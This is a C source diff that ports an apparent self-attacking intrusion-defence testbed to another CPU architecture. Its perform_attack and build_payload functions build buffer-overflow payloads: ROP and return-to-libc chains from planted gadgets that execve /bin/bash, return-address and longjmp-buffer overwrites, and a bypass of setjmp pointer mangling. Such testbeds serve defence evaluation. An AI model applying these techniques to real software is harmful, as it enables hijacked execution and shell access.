@@ -137,7 +137,7 @@ int main(int argc, char **argv) {
 
 //reliable ways to get the adresses of the return address and old base pointer
 #define OLD_BP_PTR   __builtin_frame_address(0)
-#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)
+#define RET_ADDR_PTR ((void**)OLD_BP_PTR - 1)
 
 void perform_attack(int (*stack_func_ptr_param)(const char *),
     jmp_buf stack_jmp_buffer_param) {
@@ -385,7 +385,7 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
           target_addr = &data_struct.func_ptr;
           break;
         case LONGJMP_BUF_STACK_VAR:
-          target_addr = &stack_jmp_buffer[0].__jmpbuf[7];
+          target_addr = &stack_jmp_buffer[0].__jmpbuf[1];
           break;
         case LONGJMP_BUF_STACK_PARAM:
           target_addr = &stack_jmp_buffer_param[0].__jmpbuf[7];
@@ -449,10 +449,14 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
   payload.old_base_ptr = OLD_BP_PTR;
   // used for r2libc and rop attack on jmp_buf
   payload.stack_buffer = stack_buffer2;
+  int setjmp_ret;
   switch(attack.code_ptr) {
     case LONGJMP_BUF_STACK_VAR:
       // Make sure the setjmp() is successful
-      if (setjmp(stack_jmp_buffer) != 0)
+      setjmp_ret = setjmp(stack_jmp_buffer);
+      __asm__ __volatile__("move %0, $ra" : "=r"(payload.ptr_to_correct_return_addr));
+      payload.setjmp_guard = payload.ptr_to_correct_return_addr ^ stack_jmp_buffer[0].__jmpbuf[0].__pc;
+      if (setjmp_ret != 0)
         return;
       payload.jmp_buffer = &stack_jmp_buffer;
       break;
@@ -490,8 +494,8 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
   payload.inject_param = attack.inject_param;
 
   // Bytes of the gadgets instruction we are looking for
-  char r2libc_gadget_chars[] = {0x90, 0x5F, 0xC3, '\0'};
-  char rop_gadget_chars[] = {0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, '\0'};
+  char r2libc_gadget_chars[] = {0x00, 0x00, 0x40, 0x03, 0x64, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02,0x6c, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x61, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x80, 0x01, 0x00, 0x4c, '\0'};
+  char rop_gadget_chars[] = {0x0b, 0x74, 0x83, 0x03, 0x64, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x61, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x20, 0x00, 0x00, 0x4c, '\0'};
   switch(attack.technique) {
     case DIRECT:
       // Here payload.overflow_ptr will point to the attack code since
@@ -512,7 +516,7 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
             // Look for the offset to the gadget 'pop %rdi; ret;'= 0x5fc3
             // to store '/bin/sh' in the rdi register.
             // Use a nop to make sure that we find the gadget from gagdet4
-            payload.overflow_ptr = &gadget4 + find_gadget_offset(r2libc_gadget_chars);
+            payload.overflow_ptr = &gadget4 + find_gadget_offset(r2libc_gadget_chars, sizeof(r2libc_gadget_chars) / sizeof(r2libc_gadget_chars[0]) - 1);
           } else {
             // for the other attacks we overflow function pointer and the function
             // is called with "/bin/bash" as parameter.
@@ -520,7 +524,7 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
           }
           break;
         case RETURN_ORIENTED_PROGRAMMING:
-          payload.overflow_ptr = &gadget1 + find_gadget_offset(rop_gadget_chars);
+          payload.overflow_ptr = &gadget1 + find_gadget_offset(rop_gadget_chars, sizeof(rop_gadget_chars) / sizeof(rop_gadget_chars[0]) - 1);
           break;
         default:
           if (output_error_msg) {
@@ -544,7 +548,7 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
             // Look for the offset to the gadget 'pop %rdi; ret;'= 0x5fc3
             // to store '/bin/sh' in the rdi register.
             // Use a nop to make sure that we find the gadget from gagdet4
-            payload.fake_return_addr = &gadget4 + find_gadget_offset(r2libc_gadget_chars);
+            payload.fake_return_addr = &gadget4 + find_gadget_offset(r2libc_gadget_chars, sizeof(r2libc_gadget_chars) / sizeof(r2libc_gadget_chars[0]) - 1);
           } else if ( attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
             // TODO: improve and set the first entry point here and not in the build_payload
             // to first gadget
@@ -793,6 +797,8 @@ void perform_attack(int (*stack_func_ptr_param)(const char *),
 /*******************/
 /* BUILD_PAYLOAD() */
 /*******************/
+char *argv[] = {"/bin/bash", NULL};
+char *envp[] = {NULL};
 boolean build_payload(CHARPAYLOAD *payload) {
   size_t size_shellcode, bytes_to_pad;
   char *shellcode, *temp_char_buffer, *temp_char_ptr;
@@ -910,34 +916,42 @@ boolean build_payload(CHARPAYLOAD *payload) {
 
   } else if (attack.code_ptr == RET_ADDR  && attack.technique == DIRECT &&
       attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
-    char search_chars1[] = {0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, '\0'};
+    char search_chars1[] = {0x0b, 0x74, 0x83, 0x03, 0x64, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x61, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x20, 0x00, 0x00, 0x4c, '\0'};
     temp_char_ptr = getenv("param_to_system");
-    char search_chars2[] = {0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00, 0xc3, '\0'};
-    char search_chars3[] = {0x0f, 0x05, '\0'};
+    char search_chars2[] = {0x65, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x66, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x61, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x20, 0x00, 0x00, 0x4c, '\0'};
+    char search_chars3[] = {0x00, 0x00, 0x2b, 0x00, '\0'};
     uintptr_t rop_sled[] = {
-      (uintptr_t)&gadget1 + find_gadget_offset(search_chars1),
+      (uintptr_t)&gadget1 + find_gadget_offset(search_chars1, sizeof(search_chars1) / sizeof(search_chars1[0]) - 1),
       (uintptr_t)temp_char_ptr,
-      (uintptr_t)&gadget2 + find_gadget_offset(search_chars2),
-      (uintptr_t)&gadget3 + find_gadget_offset(search_chars3),
+      (uintptr_t)&gadget2 + find_gadget_offset(search_chars2, sizeof(search_chars2) / sizeof(search_chars2[0]) - 1),
+      (uintptr_t)argv,
+      (uintptr_t)envp,
+      (uintptr_t)&gadget3 + find_gadget_offset(search_chars3, sizeof(search_chars3) / sizeof(search_chars3[0]) - 1),
       (uintptr_t)&exit};
 
-    payload->size += 4*sizeof(uintptr_t);
+    payload->size += 6*sizeof(uintptr_t);
     temp_char_buffer = (char *)malloc(payload->size);
     memcpy(temp_char_buffer, payload->buffer, payload->size);
 
     memcpy(temp_char_buffer + payload->size - 1*sizeof(uintptr_t) - sizeof(char),
-        &rop_sled[4],
+        &rop_sled[6],
         sizeof(uintptr_t));
     memcpy(temp_char_buffer + payload->size - 2*sizeof(uintptr_t) - sizeof(char),
-        &rop_sled[3],
+        &rop_sled[5],
         sizeof(uintptr_t));
     memcpy(temp_char_buffer + payload->size - 3*sizeof(uintptr_t) - sizeof(char),
-        &rop_sled[2],
+        &rop_sled[4],
         sizeof(uintptr_t));
     memcpy(temp_char_buffer + payload->size - 4*sizeof(uintptr_t) - sizeof(char),
-        &rop_sled[1],
+        &rop_sled[3],
         sizeof(uintptr_t));
     memcpy(temp_char_buffer + payload->size - 5*sizeof(uintptr_t) - sizeof(char),
+        &rop_sled[2],
+        sizeof(uintptr_t));
+    memcpy(temp_char_buffer + payload->size - 6*sizeof(uintptr_t) - sizeof(char),
+        &rop_sled[1],
+        sizeof(uintptr_t));
+    memcpy(temp_char_buffer + payload->size - 7*sizeof(uintptr_t) - sizeof(char),
         &rop_sled[0],
         sizeof(uintptr_t));
 
@@ -953,7 +967,7 @@ boolean build_payload(CHARPAYLOAD *payload) {
     // area to inject a fake stack frame with a
     // copied base pointer and a return address
     // pointing to attack code
-    payload->offset_to_fake_return_addr = (8 * sizeof(uintptr_t));
+    payload->offset_to_fake_return_addr = (10 * sizeof(uintptr_t));
 
     if (attack.technique == DIRECT)
       payload->fake_return_addr = payload->overflow_ptr;
@@ -989,15 +1003,17 @@ boolean build_payload(CHARPAYLOAD *payload) {
           sizeof(uintptr_t));
 
     } else if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
-      char search_chars1[] = {0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, '\0'};
+      char search_chars1[] = {0x0b, 0x74, 0x83, 0x03, 0x64, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x61, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x20, 0x00, 0x00, 0x4c, '\0'};
       temp_char_ptr = getenv("param_to_system");
-      char search_chars2[] = {0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00, 0xc3, '\0'};
-      char search_chars3[] = {0x0f, 0x05, '\0'};
+      char search_chars2[] = {0x65, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x66, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x61, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x20, 0x00, 0x00, 0x4c, '\0'};
+      char search_chars3[] = {0x00, 0x00, 0x2b, 0x00, '\0'};
       uintptr_t rop_sled[] = {
-        (uintptr_t)&gadget1 + find_gadget_offset(search_chars1),
+        (uintptr_t)&gadget1 + find_gadget_offset(search_chars1, sizeof(search_chars1) / sizeof(search_chars1[0]) - 1),
         (uintptr_t)temp_char_ptr,
-        (uintptr_t)&gadget2 + find_gadget_offset(search_chars2),
-        (uintptr_t)&gadget3 + find_gadget_offset(search_chars3),
+        (uintptr_t)&gadget2 + find_gadget_offset(search_chars2, sizeof(search_chars2) / sizeof(search_chars2[0]) - 1),
+      	(uintptr_t)argv,
+      	(uintptr_t)envp,
+        (uintptr_t)&gadget3 + find_gadget_offset(search_chars3, sizeof(search_chars3) / sizeof(search_chars3[0]) - 1),
         (uintptr_t)&exit};
 
       memcpy(&(payload->buffer[payload->size -
@@ -1038,6 +1054,22 @@ boolean build_payload(CHARPAYLOAD *payload) {
             4*sizeof(uintptr_t)]),
           &rop_sled[4],
           sizeof(uintptr_t));
+      
+      memcpy(&(payload->buffer[payload->size -
+            sizeof(char) -
+            sizeof(uintptr_t) -
+            payload->offset_to_fake_return_addr +
+            5*sizeof(uintptr_t)]),
+          &rop_sled[5],
+          sizeof(uintptr_t));
+      
+      memcpy(&(payload->buffer[payload->size -
+            sizeof(char) -
+            sizeof(uintptr_t) -
+            payload->offset_to_fake_return_addr +
+            6*sizeof(uintptr_t)]),
+          &rop_sled[6],
+          sizeof(uintptr_t));
     }
 
     if (attack.technique == DIRECT) {
@@ -1048,14 +1080,12 @@ boolean build_payload(CHARPAYLOAD *payload) {
       // in its correct place instead of corrupting it
       // with the terminating null char in the payload
 
-      // Extend payload size
-      payload->size += sizeof(uintptr_t);
       // Allocate new payload buffer
       temp_char_buffer = (char *)malloc(payload->size);
       // Copy current payload to new payload buffer
       memcpy(temp_char_buffer, payload->buffer, payload->size);
       // Copy existing return address to new payload
-      memcpy(temp_char_buffer + payload->size - sizeof(char) - sizeof(uintptr_t),
+      memcpy(temp_char_buffer + payload->size - sizeof(char) - sizeof(uintptr_t) - sizeof(uintptr_t),
           &(payload->ptr_to_correct_return_addr),
           sizeof(uintptr_t));
 
@@ -1070,14 +1100,14 @@ boolean build_payload(CHARPAYLOAD *payload) {
       void * tmp_ptr = (void *)(payload->buffer_addr + payload->size - // end
           sizeof(char) -       // null terminator
           sizeof(uintptr_t) -  // copied correct ret
-          sizeof(uintptr_t) -  // injected new base ptr
-          payload->offset_to_fake_return_addr -
-          sizeof(uintptr_t));  // the copied base ptr
+          payload->offset_to_fake_return_addr +
+	  sizeof(uintptr_t));
 
       // Copy pointer to copied base pointer
       memcpy(&(payload->buffer[payload->size -// end
             sizeof(char) -         // null terminator
             sizeof(uintptr_t) -    // copied correct ret
+            sizeof(uintptr_t) -
             sizeof(uintptr_t)]),    // injected new base ptr
           &tmp_ptr,
           sizeof(uintptr_t));
@@ -1100,9 +1130,9 @@ boolean build_payload(CHARPAYLOAD *payload) {
       /* If we're aiming for a direct longjmp buffer attack we need to copy */
       /* RBX, RBP*, R12, R13, R14, R15, RSP* and PC* from jmp_buffer to build a complete longjmp buffer */
       /* We construct PC just after*/
-      memcpy(&(payload->buffer[payload->size - sizeof(char) - (8*sizeof(uintptr_t))]),
+      memcpy(&(payload->buffer[payload->size - sizeof(uintptr_t) - sizeof(char) - (sizeof(struct __jmp_buf_internal_tag))]),
           payload->jmp_buffer,
-          7*sizeof(uintptr_t));
+          sizeof(struct __jmp_buf_internal_tag));
 
       /* If the payload happens to contain a null that null will */
       /* terminate all string functions so we try removing them  */
@@ -1110,21 +1140,11 @@ boolean build_payload(CHARPAYLOAD *payload) {
         remove_nulls(payload->buffer, payload->size);
       }
 
-      // need to mangle pointers
-      uintptr_t mangled_base_pointer = *(((uintptr_t *)payload->jmp_buffer)+1);
-      if (output_debug_info){
-        fprintf(stderr, "old_base_ptr:%p, rol OBP:0x%lx, mangled_old_base_ptr:0x%lx\n",
-            payload->old_base_ptr, rol((uintptr_t)payload->old_base_ptr), mangled_base_pointer);
-        fprintf(stderr, "overflow_ptr:%p, rolled: 0x%lx, ",
-            payload->overflow_ptr, rol((uintptr_t)payload->overflow_ptr));
-      }
-
       // mangle the overflow_ptr
-      payload->overflow_ptr = (void*)(rol((uintptr_t)payload->overflow_ptr) ^
-          rol((uintptr_t)payload->old_base_ptr) ^ mangled_base_pointer); // key
+      payload->overflow_ptr = (void *)((uintptr_t)payload->overflow_ptr ^ (uintptr_t)payload->setjmp_guard); 
       if (output_debug_info) fprintf(stderr, "mangled_overflow_ptr:%p\n",payload->overflow_ptr);
 
-      memcpy(&(payload->buffer[payload->size - sizeof(uintptr_t) - sizeof(char)]),
+      memcpy(&(payload->buffer[payload->size - sizeof(uintptr_t) - sizeof(char) - (sizeof(struct __jmp_buf_internal_tag))]),
           &(payload->overflow_ptr), sizeof(uintptr_t));
 
       // Set r2libc gadgets at the beginning of the buffer and make the SP points to it
@@ -1146,8 +1166,8 @@ boolean build_payload(CHARPAYLOAD *payload) {
             &tmp_ptr,
             sizeof(uintptr_t));
         // mangle the address of the buffer where there are r2libc gadgets
-        uintptr_t tmp_ptr2 = (uintptr_t)(rol((uintptr_t)payload->stack_buffer) ^
-            rol((uintptr_t)payload->old_base_ptr) ^ mangled_base_pointer); // key
+        uintptr_t tmp_ptr2 = ((uintptr_t)payload->stack_buffer) ^
+            ((uintptr_t)payload->setjmp_guard); // key
 
         memcpy(&(payload->buffer[payload->size - // end
               sizeof(char) -        // null terminator
@@ -1157,12 +1177,14 @@ boolean build_payload(CHARPAYLOAD *payload) {
             sizeof(uintptr_t));
       } else if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
         temp_char_ptr = "/bin/bash";
-        char search_chars2[] = {0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00, 0xc3, '\0'};
-        char search_chars3[] = {0x0f, 0x05, '\0'};
+        char search_chars2[] = {0x65, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x66, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x61, 0x00, 0xc0, 0x28, 0x63, 0x20, 0xc0, 0x02, 0x20, 0x00, 0x00, 0x4c, '\0'};
+        char search_chars3[] = {0x00, 0x00, 0x2b, 0x00, '\0'};
         uintptr_t rop_sled[] = {
           (uintptr_t)temp_char_ptr,
-          (uintptr_t)&gadget2 + find_gadget_offset(search_chars2),
-          (uintptr_t)&gadget3 + find_gadget_offset(search_chars3),
+          (uintptr_t)&gadget2 + find_gadget_offset(search_chars2, sizeof(search_chars2) / sizeof(search_chars2[0]) - 1),
+	  (uintptr_t)argv,
+	  (uintptr_t)envp,
+          (uintptr_t)&gadget3 + find_gadget_offset(search_chars3, sizeof(search_chars3) / sizeof(search_chars3[0]) - 1),
           (uintptr_t)&exit};
 
         memcpy(&(payload->stack_buffer[0]),
@@ -1177,15 +1199,18 @@ boolean build_payload(CHARPAYLOAD *payload) {
         memcpy(&(payload->stack_buffer[3*sizeof(uintptr_t)]),
             &rop_sled[3],
             sizeof(uintptr_t));
+        memcpy(&(payload->stack_buffer[4*sizeof(uintptr_t)]),
+            &rop_sled[4],
+            sizeof(uintptr_t));
+        memcpy(&(payload->stack_buffer[5*sizeof(uintptr_t)]),
+            &rop_sled[5],
+            sizeof(uintptr_t));
 
         // mangle the address of the buffer where there are r2libc gadgets
-        uintptr_t tmp_ptr2 = (uintptr_t)(rol((uintptr_t)payload->stack_buffer) ^
-            rol((uintptr_t)payload->old_base_ptr) ^ mangled_base_pointer); // key
+        uintptr_t tmp_ptr2 = ((uintptr_t)payload->stack_buffer) ^
+            ((uintptr_t)payload->setjmp_guard); // key
 
-        memcpy(&(payload->buffer[payload->size - // end
-              sizeof(char) -        // null terminator
-              sizeof(uintptr_t) -   // mangled PC
-              sizeof(uintptr_t)]),  // mangled SP
+        memcpy(&(payload->buffer[payload->size - sizeof(uintptr_t) - sizeof(char) - (sizeof(struct __jmp_buf_internal_tag)) + sizeof(uintptr_t)]),  // mangled SP
             &tmp_ptr2,
             sizeof(uintptr_t));
       }
@@ -1619,11 +1644,10 @@ void homebrew_memcpy(void *dst, const void *src, size_t length) {
   }
 }
 
-int find_gadget_offset(char* search_chars){
+int find_gadget_offset(char* search_chars, size_t search_chars_count){
   FILE * pFile;
   long file_len;
-  char *buffer, function_signature[] = {0x55, 0x48, 0x89, 0xE5};
-  size_t search_chars_count = strlen(search_chars);
+  char *buffer, function_signature[] = {0x63, 0x40, 0xff, 0x02, 0x76, 0xa0, 0xc0, 0x29};
   size_t function_signature_count = sizeof(function_signature)/sizeof(function_signature[0]);
   int i = 0, found = 0, current_found_i = 0, offset = 0;
 
@@ -1697,12 +1721,14 @@ void gadget1(int a, int b){
   int arthur,dent,j;
   arthur = a + b / 42;
 
-  char buffer[256];
   for(j=0;j<10;j++);
   __asm__(
-      "mov $0x3b, %rax\n"
-      "pop %rdi;\n"
-      "ret"
+      "li.d $a7, 0xdd\n"
+      "ld.d $a0, $sp, 0\n"
+      "addi.d $sp, $sp, 8\n"
+      "ld.d $ra, $sp, 0\n"
+      "addi.d $sp, $sp, 8\n"
+      "jr $ra\n"
       );
 
   return;
@@ -1713,10 +1739,14 @@ void gadget2(int a, int b){
   ford = a + b / 43;
   for(j=0;j<10;j++);
   __asm__(
-      "mov $0, %rsi\n"
-      "mov $0, %rdx\n"
-      "ret");
-
+      "ld.d $a1, $sp, 0\n"
+      "addi.d $sp, $sp, 8\n"
+      "ld.d $a2, $sp, 0\n"
+      "addi.d $sp, $sp, 8\n"
+      "ld.d $ra, $sp, 0\n"
+      "addi.d $sp, $sp, 8\n"
+      "jr $ra\n"
+      );
   return;
 }
 
@@ -1725,7 +1755,7 @@ int gadget3(int a, int b){
   i = a + b / 33;
 
   for(j=0;j<10;j++);
-  __asm__("syscall");
+  __asm__("syscall 0");
   return 42;
 }
 
@@ -1734,6 +1764,6 @@ void gadget4(int a, int b){
   i = a + 4*b / 12;
 
   for(j=0;j<5;j++);
-  __asm__("nop; pop %rdi; ret;");
+  __asm__("nop; ld.d $a0, $sp, 0; addi.d $sp, $sp, 8; ld.d $t0, $sp, 0; addi.d $sp, $sp, 8; ld.d $ra, $sp, 0; addi.d $sp, $sp, 8; jr $t0");
   return;
 }
